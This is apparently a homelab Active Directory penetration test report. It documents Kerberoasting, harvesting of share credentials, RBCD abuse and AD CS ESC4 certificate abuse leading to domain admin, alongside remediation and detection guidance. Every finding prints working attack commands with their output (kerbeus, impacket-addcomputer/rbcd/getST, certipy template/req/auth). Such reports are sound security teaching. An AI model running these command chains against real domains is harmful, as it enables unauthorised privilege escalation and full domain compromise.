# Active Directory Penetration Test Report

| Field | Detail |
|-------|--------|
| **Classification** | Confidential - Lab / Portfolio Use Only |
| **Target Environment** | Active Directory - Windows Server 2025 / Windows 11 |
| **Domain** | `corp.local` |
| **C2 Framework** | AdaptixC2 v1.2 |
| **Assessment Date** | March 2026 |
| **Report Status** | Final |
| **Assessor** | Mytk0 |

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [Scope & Objectives](#2-scope--objectives)
3. [Methodology](#3-methodology)
4. [Attack Chain Overview](#4-attack-chain-overview)
5. [Findings](#5-findings)
   - [FIND-01 - Kerberoastable Service Accounts with Weak Passwords](#find-01---kerberoastable-service-accounts-with-weak-passwords)
   - [FIND-02 - Credentials in World-Readable Network Share](#find-02---credentials-in-world-readable-network-share)
   - [FIND-03 - RBCD via Over-Privileged Intern Account (it.intern)](#find-03---rbcd-via-over-privileged-intern-account-itintern)
   - [FIND-04 - AD CS ESC4 - Write Rights on Certificate Template](#find-04---ad-cs-esc4---write-rights-on-certificate-template)
   - [FIND-05 - Audit and Logging Gaps](#find-05---audit-and-logging-gaps)
6. [Technical Narrative](#6-technical-narrative)
7. [MITRE ATT&CK Mapping](#7-mitre-attck-mapping)
8. [Detection Guidance](#8-detection-guidance)
9. [Server 2025 Hardening Observations](#9-server-2025-hardening-observations)
10. [Remediation Summary](#10-remediation-summary)

---

## 1. Executive Summary

A full-scope internal penetration test was conducted against the `corp.local` Active Directory environment running Windows Server 2025 and Windows 11. Starting from a single low-privilege domain account (`j.smith`) representing an assumed phishing compromise, the assessment resulted in **full domain compromise** - Domain Administrator NTLM hash obtained, Administrator TGT forged, SYSTEM beacon on CLIENT01 established.

Three independent attack paths were validated:

- **Path A - Kerberoasting to ESC4:** Two service accounts with weak passwords were Kerberoasted in-memory using `kerbeus tgtdeleg` (no LSASS touch). Cracked `svc_sql` credentials were used to abuse write rights on a certificate template (ESC4), enabling a certificate request impersonating the Domain Administrator.
- **Path B - Credentials in Share to RBCD:** Plaintext credentials for `it.intern` were discovered in a world-readable SMB share. The intern account had GenericWrite over `CLIENT01$`, enabling RBCD abuse, Administrator impersonation, and SYSTEM beacon deployment.
- **Path C - GPO Abuse:** `it.intern` inherited `GpoEditDeleteModifySecurity` over the `Workstation-Baseline` GPO via IT-Helpdesk membership - an independent path to workstation compromise across the entire Workstations OU.

AdaptixC2 was used as the primary C2 framework throughout. The majority of post-exploitation was conducted via BOF-based in-memory execution, leaving minimal on-disk artefacts and generating no Defender alerts on Windows Server 2025.

### Finding Summary

| Finding | Severity | CVSS |
|---------|----------|------|
| FIND-01 - Kerberoastable Service Accounts | High | 8.1 |
| FIND-02 - Credentials in Network Share | High | 8.1 |
| FIND-03 - RBCD via it.intern GenericWrite | Critical | 9.0 |
| FIND-04 - AD CS ESC4 Template Abuse | Critical | 9.8 |
| FIND-05 - Audit and Logging Gaps | Medium | 5.3 |

---

## 2. Scope & Objectives

### Environment

| Asset | IP | Role |
|---|---|---|
| DC01 | 10.10.10.10 | Domain Controller, AD CS (corp-CA), DNS |
| CLIENT01 | 10.10.10.20 | Windows 11 Workstation (OU=Workstations) |
| Kali C2 | 10.10.10.5 | Attack platform, AdaptixC2 server |
| Windows Host | 10.10.10.1 | Hyper-V host / gateway |

### Initial Foothold

| Username | Privilege | Scenario |
|---|---|---|
| `j.smith` | Low - Domain User (Sales OU) | Assumed phishing compromise - valid domain credentials only |

### Out of Scope

- Physical access
- Social engineering beyond assumed phished account
- Denial of service

---

## 3. Methodology

The assessment followed a structured kill chain aligned to MITRE ATT&CK. AdaptixC2 was the primary C2 framework, with a strong preference for BOF-based in-memory execution over disk-based tools to minimise detection surface.

| Tool | Purpose |
|---|---|
| AdaptixC2 v1.2 | C2 framework - BOF execution, Kerberos abuse, lateral movement |
| kerbeus BOF | Kerberoasting, tgtdeleg, S4U chains (in-memory, no LSASS) |
| ldap BOFs | Domain enumeration, RBCD write, machine account creation |
| certi BOF | AD CS enumeration and certificate requests |
| certipy-ad v5 | ESC4 template modification, ESC1 certificate request |
| impacket | addcomputer, rbcd, getST |
| NetExec (nxc) | SMB auth validation, remote execution, share enumeration |
| BloodHound CE | Attack path analysis - RBCD and GPO paths confirmed |
| hashcat | Offline Kerberos hash cracking (mode 13100) |

---

## 4. Attack Chain Overview

```
Initial Access (T1078.002)
  └── j.smith - phished Sales user, low-privilege domain account
        |
        ├── PATH A - Kerberoasting + ESC4 (T1558.003 + T1649)
        │     └── kerbeus tgtdeleg → TGT in-memory, no password / LSASS
        │     └── kerbeus kerberoasting → TGS for svc_web + svc_sql
        │     └── hashcat → Summer2024! / Database@2026!
        │     └── token make svc_sql → certipy ESC4 → CorpUserV3 modified
        │     └── certipy req -upn administrator@corp.local -sid S-1-5-...-500
        │     └── certipy auth → DA NTLM hash obtained
        │
        └── PATH B - Credentials in Share → RBCD (T1552.001 + T1484)
              └── smbclient CorpShare → IT-Notes.txt → it.intern:Intern2026!
              └── it.intern GenericWrite on CLIENT01$ (BloodHound confirmed)
              └── impacket-addcomputer FAKEMACHINE$ + impacket-rbcd write
              └── impacket-getST → Administrator@cifs/CLIENT01.corp.local
              └── nxc smb CLIENT01 -k --use-kcache → [+] (Pwn3d!)
              └── SCShell + atexec → WmiPrvSE.exe → SYSTEM beacon
```

---

## 5. Findings

---

### FIND-01 - Kerberoastable Service Accounts with Weak Passwords

| Field | Detail |
|---|---|
| **Severity** | High |
| **CVSS v3.1 Score** | 8.1 |
| **CVSS Vector** | `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N` |
| **MITRE ATT&CK** | T1558.003 - Kerberoasting |
| **Affected Assets** | `svc_web`, `svc_sql` |

#### Description

Two service accounts have SPNs registered and use weak, guessable passwords. Any domain user can request a Kerberos TGS for these accounts and crack the hash offline with no further domain interaction. The `kerbeus tgtdeleg` technique was used to extract a usable TGT entirely in-memory - no LSASS access, no plaintext credentials required.

#### Evidence

SPN enumeration via ldap BOF from AdaptixC2 beacon:

```
ldap get-spn svc_web
[+] Service Principal Names (1):
HTTP/web.corp.local

ldap get-spn svc_sql
[+] Service Principal Names (1):
MSSQLSvc/dc01.corp.local:1433
```

TGT extracted in-memory via `kerbeus tgtdeleg` (Kerberos GSS-API, no LSASS access):

```
kerbeus tgtdeleg
[*] Task: Kerbeus TGTDELEG
[+] Kerberos GSS-API initialization success!
[+] Delegation request success! AP-REQ delegation ticket in GSS-API output
[*] base64(ticket.kirbl): doIFbDCCBWig...
```

TGS hash captured for `svc_web` using the delegated TGT:

```
kerbeus kerberoasting /spn:HTTP/web.corp.local /ticket:doIFbDCCBWig...
[*] Action: Kerberoasting
[+] TGS request successful!
$krb5tgs$23$*USER$CORP.LOCAL$HTTP/web.corp.local*$FD14E23E21ED316A...
```

Both hashes cracked offline with hashcat (mode 13100):

```
svc_web  : Summer2024!
svc_sql  : Database@2026!
```

#### Business Impact

`svc_sql` credentials directly enabled the ESC4 certificate template abuse (FIND-04) leading to full domain compromise. `svc_web` provided authenticated domain access for lateral enumeration.

#### Remediation

1. Replace `svc_web` and `svc_sql` with **Group Managed Service Accounts (gMSA)** - 120-character auto-rotating passwords make Kerberoasting infeasible.
2. Audit all accounts with SPNs: `Get-ADUser -Filter {ServicePrincipalNames -ne '$null'} -Properties ServicePrincipalNames`
3. Remove SPNs from accounts that do not require them.
4. Alert on Event ID 4769 with `TicketEncryptionType = 0x17` (RC4) for service accounts.

#### Detection

| Event ID | Source | Description |
|---|---|---|
| 4769 | Security | Kerberos TGS - alert on EncryptionType = 0x17 (RC4) for service account SPNs |
| 4768 | Security | TGT requested - correlate source IP against known workstations |

---

### FIND-02 - Credentials in World-Readable Network Share

| Field | Detail |
|---|---|
| **Severity** | High |
| **CVSS v3.1 Score** | 8.1 |
| **CVSS Vector** | `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N` |
| **MITRE ATT&CK** | T1552.001 - Credentials in Files |
| **Affected Asset** | DC01 - `\\dc01\CorpShare` |

#### Description

The share `\\dc01\CorpShare` is readable by all domain users. The file `IT-Notes.txt` contained plaintext credentials for the `it.intern` account with a note indicating the password had not been changed since account creation.

#### Evidence

`IT-Notes.txt` downloaded via nxc as `svc_web` and read:

```
nxc smb 10.10.10.10 -u svc_web -p 'Summer2024!' -d corp.local \
  --share CorpShare --get-file IT-Notes.txt /tmp/IT-Notes.txt

cat IT-Notes.txt
it.intern account created 03/2026 - temp pass Intern2026! please change asap
```

#### Business Impact

Plaintext credentials in a publicly-readable share represent a critical operational security failure. The recovered `it.intern` credentials enabled RBCD abuse (FIND-03) and full workstation compromise.

#### Remediation

1. Remove plaintext credentials from all network shares immediately. Use a secrets manager (HashiCorp Vault, Azure Key Vault) for credential storage.
2. Audit all share contents accessible by Domain Users.
3. Rotate all credentials exposed in the share immediately.
4. Enable share access auditing - Event ID 5145 on the DC.

#### Detection

| Event ID | Source | Description |
|---|---|---|
| 5140 | Security | Network share accessed - baseline and alert on anomalous user/share combinations |
| 5145 | Security | File accessed within share - alert on sensitive filenames (*.txt) accessed by unexpected accounts |

---

### FIND-03 - RBCD via Over-Privileged Intern Account (it.intern)

| Field | Detail |
|---|---|
| **Severity** | Critical |
| **CVSS v3.1 Score** | 9.0 |
| **CVSS Vector** | `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` |
| **MITRE ATT&CK** | T1484 - Domain Policy Modification / Delegation Abuse |
| **Affected Assets** | `it.intern`, `CLIENT01$`, `FAKEMACHINE$` |

#### Description

The `it.intern` account was granted GenericWrite over the `CLIENT01$` computer object in Active Directory. This allows any attacker controlling `it.intern` to write to the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute, configuring Resource-Based Constrained Delegation (RBCD) on CLIENT01. The over-privileged intern account was created as a rushed onboarding action and inherited dangerous permissions through IT-Helpdesk group membership.

#### Evidence

BloodHound confirming GenericWrite from `it.intern` to `CLIENT01$`:

```
MATCH p=(u:User)-[:GenericWrite]->(c:Computer) RETURN p
# Result: IT.INTERN@CORP.LOCAL --[GenericWrite]--> CLIENT01.CORP.LOCAL
```

`token make` used to impersonate `it.intern` within the `j.smith` beacon session (logon type 9):

```
token make it.intern Intern2026! corp.local 9
[+] BOF output
The user impersonated successfully: corp.local\it.intern (logon: 9)
```

`kerbeus asktgt` - obtaining TGT for `it.intern` and injecting into session:

```
kerbeus asktgt /user:it.intern /password:Intern2026! /domain:corp.local /dc:DC01.corp.local /ptt
[*] Building AS-REQ (w/ preauth) for: 'corp.local\it.intern'
[+] TGT request successful!
[+] Ticket successfully imported!
```

FAKEMACHINE$ created and RBCD configured:

```
impacket-addcomputer corp.local/it.intern:'Intern2026!' -computer-name 'FAKEMACHINE$' \
  -computer-pass 'FakeMachinePass123!' -dc-ip 10.10.10.10 -use-ldaps

impacket-rbcd corp.local/it.intern:'Intern2026!' -action write \
  -delegate-to 'CLIENT01$' -delegate-from 'FAKEMACHINE$' \
  -dc-ip 10.10.10.10 -use-ldaps
```

Administrator service ticket obtained via S4U2Self + S4U2Proxy:

```
impacket-getST corp.local/FAKEMACHINE$:'FakeMachinePass123!' \
  -spn cifs/CLIENT01.corp.local -impersonate Administrator \
  -dc-ip 10.10.10.10 -use-ldaps

Administrator@cifs/CLIENT01.corp.local → ticket saved
```

CLIENT01 access confirmed as Administrator (Pwn3d!):

```
nxc smb 10.10.10.20 -k --use-kcache
[+] corp.local\Administrator (Pwn3d!)
```

SYSTEM beacon deployed via SCShell + atexec, process masqueraded as `WmiPrvSE.exe`.

#### Business Impact

Full local Administrator access on CLIENT01 was obtained without any privileged credentials. The misconfiguration - intern account spun up with excessive permissions - is representative of real-world AD sprawl and highlights the risk of unreviewed group membership inheritance.

#### Remediation

1. Remove GenericWrite from `it.intern` on `CLIENT01$`. Audit all non-admin accounts with write rights on computer objects.
2. Reduce Machine Account Quota to 0: `Set-ADDomain -Identity corp.local -Replace @{'ms-DS-MachineAccountQuota'=0}`
3. Add high-privilege accounts to the Protected Users security group - prevents delegation abuse entirely.
4. Audit IT-Helpdesk group membership - `it.intern` inherited GPO edit rights through this group, compounding the exposure.

#### Detection

| Event ID | Source | Description |
|---|---|---|
| 4741 | Security | Computer account created - alert on new machine accounts created by non-admin users |
| 4769 | Security | S4U2Proxy - alert where requesting account differs from ticket subject |
| 4662 | Security | AD object attribute modified - alert on writes to `msDS-AllowedToActOnBehalfOfOtherIdentity` (requires 5136 audit) |

---

### FIND-04 - AD CS ESC4 - Write Rights on Certificate Template

| Field | Detail |
|---|---|
| **Severity** | Critical |
| **CVSS v3.1 Score** | 9.8 |
| **CVSS Vector** | `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` |
| **MITRE ATT&CK** | T1649 - Steal or Forge Authentication Certificates |
| **Affected Asset** | DC01 - corp-CA - `CorpUserV3` |

#### Description

The `svc_sql` service account has GenericAll (Full Control) over the `CorpUserV3` certificate template. This allows `svc_sql` to modify `msPKI-Certificate-Name-Flag` - the flag controlling whether enrollees can supply an arbitrary Subject Alternative Name (SAN). By flipping this flag to 1, `svc_sql` converted `CorpUserV3` into an ESC1-vulnerable template, then requested a certificate impersonating the Domain Administrator. Windows Server 2025 KB5014754 SID extension enforcement was handled by resolving the Administrator SID via `rpcclient` and embedding it in the certificate request.

#### Evidence

Template enumeration revealing ESC4:

```
certipy-ad find -u svc_sql@corp.local -p 'Database@2026!' -vulnerable -dc-ip 10.10.10.10

[!] ESC1: Enrollee supplies subject and template allows client authentication
[!] ESC4: User has dangerous permissions
```

Template modified to enable enrollee-supplied subject (ESC4 to ESC1):

```
certipy-ad template -u svc_sql@corp.local -p 'Database@2026!' \
  -template CorpUserV3 -write-default-configuration -dc-ip 10.10.10.10

[*] msPKI-Certificate-Name-Flag: 1
[*] Successfully updated 'CorpUserV3'
```

Administrator SID resolved for KB5014754 SID extension compliance:

```
rpcclient -U 'svc_sql%Database@2026!' 10.10.10.10 -c "lookupnames administrator"
administrator S-1-5-21-2707865489-1470825099-139071591-500 (User: 1)
```

Certificate requested impersonating Domain Administrator:

```
certipy-ad req -u svc_sql@corp.local -p 'Database@2026!' -ca corp-CA \
  -template CorpUserV3 -upn administrator@corp.local \
  -sid S-1-5-21-2707865489-1470825099-139071591-500 -dc-ip 10.10.10.10

[*] Certificate object SID is 'S-1-5-21-2707865489-1470825099-139071591-500'
[*] Saved certificate and private key to 'administrator.pfx'
```

PKINIT authentication returning Domain Administrator NTLM hash:

```
certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.10.10

[*] Got TGT
[*] Got hash for 'administrator@corp.local': <redacted>
```

#### Business Impact

A Kerberoastable service account with a crackable password was the only prerequisite for full domain compromise. The attack chain - Kerberoast, crack, ESC4, DA - can be executed in under 10 minutes from any domain-joined host with no interactive logon events on the DC.

#### Remediation

1. Remove dangerous permissions from `svc_sql` on `CorpUserV3`. No service account should have write rights over a certificate template.
2. Reset `msPKI-Certificate-Name-Flag` to 0 on `CorpUserV3` - disables enrollee-supplied subject.
3. Replace `svc_sql` with a gMSA - 120-character auto-rotating password makes Kerberoasting infeasible.
4. Enable CA auditing: `certutil -setreg CA\AuditFilter 127`
5. Run `Invoke-ESC4Check` from [PSPKIAudit](https://github.com/GhostPack/PSPKIAudit) regularly to detect misconfigured template ACLs.

#### Detection

| Event ID | Source | Description |
|---|---|---|
| 4886 | Security | Certificate request received - review SAN for UPN mismatches |
| 4887 | Security | Certificate issued - alert on UPN not matching requestor |
| 4769 | Security | Kerberos TGS - alert on PKINIT auth from unexpected sources |
| 5136 | Security | AD object modified - alert on writes to `msPKI-Certificate-Name-Flag` (requires DS Changes audit) |

---

### FIND-05 - Audit and Logging Gaps

| Field | Detail |
|---|---|
| **Severity** | Medium |
| **CVSS v3.1 Score** | 5.3 |
| **CVSS Vector** | `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` |
| **MITRE ATT&CK** | T1562.002 - Impair Defenses: Disable Windows Event Logging |
| **Affected Asset** | DC01 - Audit Policy |

#### Description

Two critical audit subcategories were not enabled during the assessment, meaning the most impactful attacks left zero forensic evidence in Windows event logs. Directory Service Changes (Event ID 5136) was not enabled - the RBCD write and ESC4 template modification left no AD object change logs. AD CS Certificate Services (Event IDs 4886/4887) was not configured - all certificate requests including the DA certificate are invisible in the event log.

#### Evidence

```
auditpol /get /subcategory:"Directory Service Changes"
  Directory Service Changes: No Auditing

certutil -getreg CA\AuditFilter
  AuditFilter = 0
```

#### Remediation

1. Enable DS Changes audit: `auditpol /set /subcategory:"Directory Service Changes" /success:enable /failure:enable`
2. Enable CA auditing: `certutil -setreg CA\AuditFilter 127`
3. Deploy Microsoft Defender for Identity (MDI) - detects RBCD writes, Kerberoasting, and certificate abuse natively.

#### Detection

| Event ID | Source | Description |
|---|---|---|
| 5136 | Security | AD object modified - enable DS Changes audit subcategory |
| 4886 | Security | Certificate request received - enable CA AuditFilter |
| 4887 | Security | Certificate issued - enable CA AuditFilter |

---

## 6. Technical Narrative

### Phase 1 - Initial Access and Reconnaissance

Initial foothold was `j.smith`, a low-privilege Sales department user. Enumeration was conducted via AdaptixC2 BOFs to minimise process noise. SPN enumeration, user discovery, and delegation checks were all performed in-memory.

### Phase 2 - Credential Discovery

`j.smith` browsed `\\dc01\CorpShare` and retrieved `IT-Notes.txt` containing plaintext credentials for `it.intern`. `svc_web` (obtained via Kerberoasting) was subsequently used to re-download the file to demonstrate the share was accessible from multiple compromised accounts.

### Phase 3 - Kerberoasting

Using `kerbeus tgtdeleg`, a usable TGT for `j.smith` was extracted via Kerberos GSS-API delegation entirely in-memory - no LSASS access, no plaintext password required. TGS hashes were captured for both `svc_web` (`Summer2024!`) and `svc_sql` (`Database@2026!`) and cracked offline with hashcat.

### Phase 4 - RBCD Abuse

With `it.intern` credentials and BloodHound confirming GenericWrite on `CLIENT01$`, a machine account (`FAKEMACHINE$`) was created and RBCD configured via `impacket-rbcd`. The S4U2Self and S4U2Proxy chain was executed via `impacket-getST`, yielding an Administrator service ticket for `cifs/CLIENT01.corp.local`. SYSTEM beacon was deployed via SCShell service binary path modification and atexec execution, masqueraded as `WmiPrvSE.exe`.

Registry persistence was established via the HKCU Run key (`OneDriveUpdater.exe`) under the beacon process.

### Phase 5 - ESC4 Domain Compromise

With `svc_sql` credentials, `certipy-ad` was used to modify the `CorpUserV3` template (ESC4), enabling enrollee-supplied subject. A certificate was requested with `administrator@corp.local` as the UPN and the Administrator SID embedded (required by KB5014754 on Server 2025). `certipy auth` yielded a TGT and NTLM hash for the Domain Administrator - full domain compromise achieved.

---

## 7. MITRE ATT&CK Mapping

| Technique ID | Technique | Tool / Method | Finding |
|---|---|---|---|
| T1078.002 | Valid Accounts - Domain | `j.smith` initial foothold | - |
| T1087.002 | Account Discovery | ldap BOFs - users, SPNs | - |
| T1135 | Network Share Discovery | smbclient CorpShare | FIND-02 |
| T1552.001 | Credentials in Files | IT-Notes.txt plaintext | FIND-02 |
| T1558.003 | Kerberoasting | kerbeus tgtdeleg + kerberoasting | FIND-01 |
| T1110.002 | Password Cracking | hashcat mode 13100 | FIND-01 |
| T1484 | Domain Policy Modification | RBCD msDS-AllowedToActOnBehalfOfOtherIdentity | FIND-03 |
| T1649 | Steal/Forge Certificates | certipy ESC4 + ESC1 | FIND-04 |
| T1547.001 | Run Key Persistence | HKCU Run - OneDriveUpdater.exe | - |
| T1036 | Masquerading | OneDriveUpdater.exe / WmiPrvSE.exe | - |
| T1562.002 | Disable Logging | 5136 + CA audit not enabled | FIND-05 |

---

## 8. Detection Guidance

### What Was Visible

**Kerberoasting pattern (Event 4769)**

Multiple TGS requests for service accounts from 10.10.10.5 (Kali) using RC4 encryption type (0x17). Service accounts authenticating from non-server IPs in rapid succession is a reliable Kerberoasting indicator.

```
4769 | svc_web | EncryptionType=0x17 | Source=::ffff:10.10.10.5
4769 | svc_sql | EncryptionType=0x17 | Source=::ffff:10.10.10.5
```

**RBCD S4U chain (Event 4769 + 4741)**

`FAKEMACHINE$` - created minutes earlier - requesting service tickets for `CLIENT01$` impersonating Administrator. New machine accounts followed immediately by S4U2Proxy requests are a textbook RBCD indicator.

```
4741 | FAKEMACHINE$ created by it.intern
4769 | FAKEMACHINE$@CORP.LOCAL → CLIENT01$ (S4U2Proxy)
4769 | Administrator@corp.local → cifs/CLIENT01 | Source=::ffff:10.10.10.5
```

**ESC4 cert authentication (Event 4768)**

Administrator TGT requested from 10.10.10.5 via PKINIT with no prior DA authentication from that IP.

### What Was NOT Visible (Detection Gaps)

| Missing Visibility | Root Cause | Impact |
|---|---|---|
| RBCD write (msDS-AllowedToActOnBehalfOfOtherIdentity) | 5136 audit disabled | Critical RBCD configuration change unlogged |
| ESC4 template modification | 5136 audit disabled | msPKI-Certificate-Name-Flag change invisible |
| Certificate requests | CA AuditFilter = 0 | All ESC4 cert requests invisible |
| Beacon persistence (Run key) | No registry audit | OneDriveUpdater.exe Run key write unlogged |

---

## 9. Server 2025 Hardening Observations

Several Windows Server 2025 security controls were encountered and affected the attack methodology. All attacks succeeded despite these controls - hardening increased complexity but did not prevent compromise.

| Control | Behaviour | Attack Impact |
|---|---|---|
| LDAP Channel Binding | Unsigned LDAP binds rejected | All impacket LDAP ops required `-use-ldaps` flag |
| LDAP Signing Enforcement | BOF LDAP writes returned Operations Error (0x1) | `ldap add-computer` and `ldap set-attribute` BOFs failed without TGT injection + LDAPS |
| KB5014754 SID Extension | Cert auth failed without SID extension | Required `rpcclient lookupnames` + certipy `-sid` flag |
| S4U BOF Compatibility | kerbeus s4u returned KDC_ERR_BADOPTION (error 14) | S4U2Self via BOF requires TrustedToAuthForDelegation; fell back to `impacket-getST` |
| Defender Real-Time Protection | atexec output quarantined | Remote exec ran but output required alternative retrieval |

---

## 10. Remediation Summary

| Finding | Severity | CVSS | Priority Action |
|---|---|---|---|
| FIND-01 - Kerberoastable Accounts | High | 8.1 | Replace `svc_web` and `svc_sql` with gMSAs |
| FIND-02 - Credentials in Share | High | 8.1 | Remove plaintext creds; rotate `it.intern` |
| FIND-03 - RBCD via it.intern | Critical | 9.0 | Remove GenericWrite ACE; set MAQ to 0 |
| FIND-04 - AD CS ESC4 | Critical | 9.8 | Remove `svc_sql` write rights on `CorpUserV3`; enable CA auditing |
| FIND-05 - Audit Gaps | Medium | 5.3 | Enable 5136 and CA AuditFilter = 127 |

**Immediate (within 24 hours):**
- Rotate `it.intern`, `svc_sql`, `svc_web` passwords
- Remove `it.intern` GenericWrite ACE from `CLIENT01$`
- Reset `msPKI-Certificate-Name-Flag` to 0 on `CorpUserV3`
- Enable CA auditing: `certutil -setreg CA\AuditFilter 127`
- Remove plaintext credentials from `\\dc01\CorpShare`

**Short-term (within 7 days):**
- Replace `svc_sql` and `svc_web` with gMSAs
- Set Machine Account Quota to 0
- Enable Directory Service Changes audit subcategory
- Audit all ACEs granting GenericWrite / GenericAll to non-admin accounts on computer objects

**Medium-term (within 30 days):**
- Deploy Microsoft Defender for Identity (MDI)
- Implement tiered administration model (Tier 0 / 1 / 2)
- Enrol all privileged accounts in the Protected Users security group
- Conduct full AD CS template audit using [PSPKIAudit](https://github.com/GhostPack/PSPKIAudit)

---

## References

- SpecterOps - Certified Pre-Owned (ESC1-ESC8): https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf
- Certipy by Oliver Lyak: https://github.com/ly4k/Certipy
- AdaptixC2 Framework: https://github.com/Adaptix-Framework/AdaptixC2
- AdaptixC2 Extension-Kit: https://github.com/Adaptix-Framework/Extension-Kit
- Impacket by Fortra: https://github.com/fortra/impacket
- Microsoft KB5014754: https://support.microsoft.com/en-us/topic/kb5014754

---

*Tags: #homelab #activedirectory #redteam #ADCS #ESC4 #RBCD #Kerberoasting #LOLBins #Server2025 #AdaptixC2 #pentest*
